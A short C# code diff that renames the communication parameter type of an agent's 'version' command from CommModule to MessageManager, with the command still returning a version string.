@@ -11,7 +11,7 @@ namespace Agent.Commands
     {
         public override string Name => "version";
 
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
+        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, MessageManager commm)
         {
             result.Result = "Version : 3.1";
         }
